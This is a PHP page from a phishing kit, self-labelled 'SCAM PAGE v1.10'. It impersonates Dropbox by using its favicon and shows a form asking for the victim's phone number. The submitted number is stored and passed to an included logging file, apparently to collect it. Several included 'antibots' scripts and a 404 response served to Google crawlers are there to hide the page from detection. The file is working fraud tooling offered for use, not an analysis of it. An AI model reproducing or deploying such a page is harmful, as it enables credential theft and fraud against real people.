<?php
/*   
   _____   _                   _                       
  / ____| | |                 | |                      
 | (___   | |__     __ _    __| |   ___   __      __   
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /   
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /   
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     
                                                                                
                              #=======================#
                              #   SCAM PAGE v1.10     #
                              #        M3k$           #
                              #=======================#
                   
*/

session_start();
error_reporting(0);
##################### SECOND FILES #####################
include('../../functions/get_lang_en.php'); 
################## ACCOUNT INFORMATION #################
$_SESSION['_phone_']    = $_POST['phone'];
################## ACCOUNT INFORMATION #################
if(filter_var($_POST['phone'])){  
    include('LOG2.php');
}
$charSet = "XXXXID0123456789";
$charSetSize = strlen($charSet); $pwdSize = 6;
for ($i = 0; $i < $pwdSize; $i++) {
  $XXX_03 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_04 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_05 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_06 .= $charSet[ rand( 5, strlen($charSetSize) - 1 ) ];
}

 $Z118xF0rm3XX = $XXX_03.mt_rand();
 $x87Z_E54IlsXX = $XXX_04.mt_rand();
 $Zx987P4ss0WrD = $XXX_05.mt_rand();
 $GrimmDZEBI987 = $XXX_06.mt_rand();
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html id="<?="x_".rand(3004, 2000)."".rand(7809, 5016)?>">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title><?=$Z118_01;?></title>
<link href="https://cfl.dropboxstatic.com/static/images/favicon-vflUeLeeY.ico" rel="shortcut icon" type="image/x-icon">
<link href="Untitled1.css" rel="stylesheet">
<link href="index2.css" rel="stylesheet">
</head>
<body>
<form name="ff" action="" method="POST">
<div id="wb_Image1" style="position:absolute;left:0px;top:504px;z-index:1;"></div>
<input type="text" id="Editbox1" style="position:absolute;left:690px;top:252px;width:343px;height:34px;line-height:26px;z-index:2;" name="phone" placeholder="Your Phone Number" required>

<input type="submit" id="Button" name="" value="Continue" style="position:absolute;left:960px;top:296px;width:79px;height:33px;z-index:3;">


</div>

</form>
</body>
</html>
<?php
/*		
Enjoy bby its clean
		     ___________________________
            ,        ,
           /(        )`
            ___   / |
            /- _  `-/  '
           (//     /
           / /   | `
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __
<----|====O)))==) ) /====
<----'    `--' `.__,'
             |        |
                     /
        ______( (_  / ______
      ,'  ,-----'   |
      `--{__________)        /

*/




























?>

